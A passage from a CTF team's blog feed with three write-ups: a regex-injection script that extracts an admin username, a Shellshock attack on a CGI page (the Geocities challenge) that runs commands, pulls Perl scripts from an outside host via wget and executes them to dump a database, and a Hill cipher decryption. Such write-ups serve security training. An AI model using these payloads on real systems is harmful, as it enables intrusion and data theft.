<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment">#for x in "abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":</span></div><div class="line">username = <span class="string">''</span></div><div class="line">lower_alpha = <span class="string">'[a-z]'</span></div><div class="line">upper_alpha = <span class="string">'[A-Z]'</span></div><div class="line">digits = <span class="string">'[0-9]'</span></div><div class="line">special = <span class="string">'[^\w]'</span></div><div class="line">regex_string = <span class="string">''</span></div><div class="line">d = &#123;lower_alpha : string.ascii_lowercase, upper_alpha : string.ascii_uppercase, digits: string.digits, special: string.punctuation + string.whitespace&#125;</div><div class="line">regex = [lower_alpha, upper_alpha, digits, special]</div><div class="line">char_found = <span class="keyword">True</span></div><div class="line">regex_found = <span class="keyword">True</span></div><div class="line"><span class="keyword">while</span> regex_found:</div><div class="line">    regex_found = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> regex:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            a = requests.post(<span class="string">'http://problems.ctfx.io:7003/users'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'^%s.*'</span> % (regex_string+r), <span class="string">'password'</span>: <span class="string">'a'</span>, <span class="string">'realname'</span>: <span class="string">'a'</span>&#125;)</div><div class="line">            <span class="keyword">if</span> (a.status_code != <span class="number">200</span>):</div><div class="line">                <span class="comment">#print a.text, r</span></div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> (<span class="string">"FAILED: User with that name already exists!"</span> <span class="keyword">in</span> a.text):</div><div class="line">                regex_found = <span class="keyword">True</span></div><div class="line">                char_found = <span class="keyword">True</span></div><div class="line">                regex_string += r</div><div class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> d[r]:</div><div class="line">                    char_found = <span class="keyword">False</span></div><div class="line">                    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                        <span class="keyword">if</span> (x <span class="keyword">in</span> <span class="string">'\.[]&#123;&#125;()*+-?^$|'</span>):</div><div class="line">                            x = <span class="string">'\\'</span> + x</div><div class="line">                        a = requests.post(<span class="string">'http://problems.ctfx.io:7003/users'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'^(%s).*'</span> % (username+x), <span class="string">'password'</span>: <span class="string">'a'</span>, <span class="string">'realname'</span>: <span class="string">'a'</span>&#125;)</div><div class="line">                        <span class="keyword">if</span> (a.status_code != <span class="number">200</span>):</div><div class="line">                            <span class="comment">#print a.text, x</span></div><div class="line">                            <span class="keyword">continue</span></div><div class="line">                        <span class="comment"># print a.text, x</span></div><div class="line">                        <span class="keyword">if</span> (<span class="string">"FAILED: User with that name already exists!"</span> <span class="keyword">in</span> a.text):</div><div class="line">                            username += x</div><div class="line">                            char_found = <span class="keyword">True</span></div><div class="line">                            <span class="keyword">print</span> <span class="string">"The username: "</span> + username</div><div class="line">                        <span class="keyword">break</span></div><div class="line">                    <span class="keyword">if</span> char_found:</div><div class="line">                        <span class="keyword">break</span></div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/c/web2&gt; python a.py</div><div class="line">The username: \[</div><div class="line">The username: \[A</div><div class="line">The username: \[Ad</div><div class="line">The username: \[Adm</div><div class="line">The username: \[Admi</div><div class="line">The username: \[Admin</div><div class="line">The username: \[Admin\]</div><div class="line">The username: \[Admin\] </div><div class="line">The username: \[Admin\] A</div><div class="line">The username: \[Admin\] Ar</div><div class="line">The username: \[Admin\] Arx</div><div class="line">The username: \[Admin\] Arxe</div><div class="line">The username: \[Admin\] Arxen</div><div class="line">The username: \[Admin\] Arxeni</div><div class="line">The username: \[Admin\] Arxenix</div><div class="line">The username: \[Admin\] Arxenixi</div><div class="line">The username: \[Admin\] Arxenixis</div><div class="line">The username: \[Admin\] Arxenixisa</div><div class="line">The username: \[Admin\] Arxenixisal</div><div class="line">The username: \[Admin\] Arxenixisalo</div><div class="line">The username: \[Admin\] Arxenixisalos</div><div class="line">The username: \[Admin\] Arxenixisalose</div><div class="line">The username: \[Admin\] Arxenixisaloser</div></pre></td></tr></table></figure>
<p>One the second one we can see that is doing same thing but now with the password, so now we have the admin username we can just inject this regex “^*.” on the password and get the flag :)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian /v/w/html&gt; curl <span class="string">'http://problems.ctfx.io:7003/name?username=\[Admin\]%20Arxenixisaloser&amp;password=^.*'</span></div><div class="line">ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;This site was created in honor of harambe: &lt;a href=&quot;http://problems.ctfx.io:7003/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pro
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="regex" scheme="https://teamrocketist.github.io/tags/regex/"/>
    
      <category term="java" scheme="https://teamrocketist.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>IceCTF [web] - Geocities</title>
    <link href="https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/"/>
    <id>https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/</id>
    <published>2016-08-26T23:00:46.000Z</published>
    <updated>2017-08-10T03:03:33.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote>I recently stumbled onto this old geocities site (<a href="http://geocities.vuln.icec.tf/" target="_blank" rel="external">http://geocities.vuln.icec.tf/</a>), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys!</blockquote>

<p>After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “<a href="http://geocities.vuln.icec.tf/index.cgi" target="_blank" rel="external">http://geocities.vuln.icec.tf/index.cgi</a>“ and it existed! Now lets try some ShellShock with Curl:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/ls"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line"></div><div class="line">blog.html</div><div class="line">get_posts.pl</div><div class="line">img</div><div class="line">index.cgi</div></pre></td></tr></table></figure>
<p>And it worked! now lets start looking into those files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/cat get_posts.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line">use strict;</div><div class="line">use DBI;</div><div class="line"></div><div class="line">my <span class="variable">$dbh</span> = DBI-&gt;connect(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; RaiseError =&gt; 1 &#125;,</div><div class="line">) or die <span class="variable">$DBI</span>::errstr;</div><div class="line"></div><div class="line">my <span class="variable">$sth</span> = <span class="variable">$dbh</span>-&gt;prepare(<span class="string">"SELECT * from Posts ORDER BY post_date DESC"</span>);</div><div class="line"><span class="variable">$sth</span>-&gt;execute();</div><div class="line"></div><div class="line">my <span class="variable">$row</span>;</div><div class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$sth</span>-&gt;fetchrow_arrayref()) &#123;</div><div class="line">    <span class="built_in">print</span> <span class="string">"@<span class="variable">$row</span>[1];@<span class="variable">$row</span>[2];@<span class="variable">$row</span>[3]\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$sth</span>-&gt;finish();</div><div class="line"><span class="variable">$dbh</span>-&gt;disconnect();</div></pre></td></tr></table></figure>
<p>Oh a perl script that connects to a sql databases maybe our flag is somewhere in that database! but first we need to access it! After this I tried a reverse shell but It wasn’t working so I just tried to access mysql with the command since we already had the credentials from the source above, but failed to execute even trying the most common locations of mysql (maybe the admins deactivated this for security reasons for the current user running the website) then I thought of replicate the perl script above and send it to /tmp folder and execute it.</p>
<p>The first thing I had to do was to know what is the name of the other sql tables this could be easy with a select to the informationschema tables:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> DBI;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; <span class="string">RaiseError =&gt;</span> <span class="number">1</span> &#125;,</div><div class="line">) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'geocities'"</span>);</div><div class="line">$sth-&gt;execute();</div><div class="line"></div><div class="line"><span class="keyword">my</span> @row;</div><div class="line"><span class="keyword">while</span> (@row = $sth-&gt;fetchrow_array) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">", "</span>, @row), <span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sth-&gt;finish();</div><div class="line">$dbh-&gt;disconnect();</div></pre></td></tr></table></figure>
<p>Now we need to upload this to /tmp and chmod it to get execute permissions and finally execute it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget hostedwebserver.com/plz.pl -O /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/chmod +x /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/cat /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi </div><div class="line">47a6fd2ca39d2b0d6eea1c30008dd889</div><div class="line">Posts</div></pre></td></tr></table></figure>
<p>So we have two database tables one named posts and the other named 47a6fd2ca39d2b0d6eea1c30008dd889, now we only need to select everything from this one and see if the flag is in it:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> DBI;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; <span class="string">RaiseError =&gt;</span> <span class="number">1</span> &#125;,</div><div class="line">) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * from 47a6fd2ca39d2b0d6eea1c30008dd889"</span>);</div><div class="line">$sth-&gt;execute();</div><div class="line"></div><div class="line"><span class="keyword">my</span> @row;</div><div class="line"><span class="keyword">while</span> (@row = $sth-&gt;fetchrow_array) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">", "</span>, @row), <span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sth-&gt;finish();</div><div class="line">$dbh-&gt;disconnect();</div></pre></td></tr></table></figure>
<p>Same process again to upload and run the perl script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget hostedwebserver.com/tables.pl -O /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/chmod +x /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">1, IceCTF&#123;7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7&#125;</div></pre></td></tr></table></figure>
<p>And jackpot the flag is IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;I recently stumbled onto this old geocities site (&lt;a href=&quot;http://geocities.vuln.icec.tf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http:/
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="shellshock" scheme="https://teamrocketist.github.io/tags/shellshock/"/>
    
      <category term="perl" scheme="https://teamrocketist.github.io/tags/perl/"/>
    
      <category term="sql" scheme="https://teamrocketist.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>IceCTF [Cryptography] - Hill Cipher</title>
    <link href="https://teamrocketist.github.io/2016/08/26/IceCTF-Cryptography-Hill-Cipher/"/>
    <id>https://teamrocketist.github.io/2016/08/26/IceCTF-Cryptography-Hill-Cipher/</id>
    <published>2016-08-26T20:05:38.000Z</published>
    <updated>2017-08-10T02:45:15.734Z</updated>
    
    <content type="html"><![CDATA[<p>On this challenge we were given the decoding matrix and the cipher text:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">secret = [[<span class="number">54</span>, <span class="number">53</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">54</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">7</span>],</div><div class="line">          [<span class="number">32</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">52</span>],</div><div class="line">          [<span class="number">63</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">18</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">3</span>],</div><div class="line">          [<span class="number">63</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">53</span>, <span class="number">16</span>],</div><div class="line">          [<span class="number">35</span>, <span class="number">43</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">35</span>, <span class="number">37</span>],</div><div class="line">          [<span class="number">20</span>, <span class="number">59</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">12</span>, <span class="number">61</span>],</div><div class="line">          [<span class="number">26</span>, <span class="number">39</span>, <span class="number">27</span>, <span class="number">59</span>, <span class="number">44</span>, <span class="number">54</span>, <span class="number">23</span>, <span class="number">56</span>],</div><div class="line">          [<span class="number">32</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">47</span>, <span class="number">31</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">41</span>]]</div><div class="line">    ciphertext = <span class="string">"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ"</span></div></pre></td></tr></table></figure>
<p>With this we can easily decode the ciphered text we only need to write a python script (to know how it works the decryption for hill cipher read this <a href="http://crypto.interactive-maths.com/hill-cipher.html" target="_blank" rel="external">http://crypto.interactive-maths.com/hill-cipher.html</a>) the one I wrote requires sympy package installed run pip install sympy:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="keyword">import</span> sympy</div><div class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> init_printing, pprint</div><div class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</div><div class="line"><span class="keyword">from</span> sympy.vector <span class="keyword">import</span> matrix_to_vector, CoordSysCartesian</div><div class="line">init_printing()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(matrix, words)</span>:</span></div><div class="line">    cipher = <span class="string">''</span></div><div class="line">    M = Matrix(matrix)</div><div class="line">    M = M.inv_mod(<span class="number">64</span>)</div><div class="line">    length = len(M)</div><div class="line">    d = &#123;&#125;</div><div class="line">    d2 = &#123;&#125;</div><div class="line">    <span class="comment"># arr = np.array([d[i] = j; j +=1 for i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;"], dtype=int)</span></div><div class="line">    alph = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;"</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(alph)):</div><div class="line">        d[alph[x]] = x</div><div class="line">        d2[x] = alph[x]</div><div class="line">    <span class="comment"># print d</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    l = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> words:</div><div class="line">        <span class="keyword">if</span> (count+<span class="number">1</span>) % (<span class="number">8</span>+<span class="number">1</span>) == <span class="number">0</span>:</div><div class="line">            m = Matrix(l)</div><div class="line">            dot_pr_m = M*m</div><div class="line">            <span class="comment"># print mcd(dot_pr_m)</span></div><div class="line">            <span class="comment"># pprint(dot_pr_m.rref()[0][0])</span></div><div class="line">            n = []</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> dot_pr_m:</div><div class="line">                cipher += d2[i % <span class="number">64</span>]</div><div class="line">            count = <span class="number">0</span></div><div class="line">            l = []</div><div class="line">        l.append(d[ch])</div><div class="line">        count += <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> (count+<span class="number">1</span>) % (<span class="number">8</span>+<span class="number">1</span>) == <span class="number">0</span>:</div><div class="line">        m = Matrix(l)</div><div class="line">        dot_pr_m = M*m</div><div class="line">        <span class="comment"># print mcd(dot_pr_m)</span></div><div class="line">        <span class="comment"># pprint(dot_pr_m.rref()[0][0])</span></div><div class="line">        n = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dot_pr_m:</div><div class="line">            cipher += d2[i % <span class="number">64</span>]</div><div class="line">    <span class="keyword">return</span> cipher</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment">#print mcd([])</span></div><div class="line">    <span class="comment"># exit(0)</span></div><div class="line">    secret = [[<span class="number">54</span>, <span class="number">53</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">54</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">7</span>],</div><div class="line">          [<span class="number">32</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">52</span>],</div><div class="line">          [<span class="number">63</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">18</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">3</span>],</div><div class="line">          [<span class="number">63</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">53</span>, <span class="number">16</span>],</div><div class="line">          [<span class="number">35</span>, <span class="number">43</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">35</span>, <span class="number">37</span>],</div><div class="line">          [<span class="number">20</span>, <span class="number">59</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">12</span>, <span class="number">61</span>],</div><div class="line">          [<span class="number">26</span>, <span class="number">39</span>, <span class="number">27</span>, <span class="number">59</span>, <span class="number">44</span>, <span class="number">54</span>, <span class="number">23</span>, <span class="number">56</span>],</div><div class="line">          [<span class="number">32</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">47</span>, <span class="number">31</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">41</span>]]</div><div class="line">    ciphertext = <span class="string">"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ"</span></div><div class="line">    <span class="comment"># secret = [[7,8], [11,11]]</span></div><div class="line">    <span class="comment"># ciphertext = 'APADJTFTWLFJ'.lower()</span></div><div class="line">    print(ciphertext)</div><div class="line">    </div><div class="line">print(decrypt(secret, ciphertext))</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/crl&gt; python hill-cipher.py </div><div class="line"></div><div class="line"><span class="number">7</span>Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ</div><div class="line">IceCTF&#123;linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;On this challenge we were given the decoding matrix and the cipher text:&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
  </entry>
  
</feed>
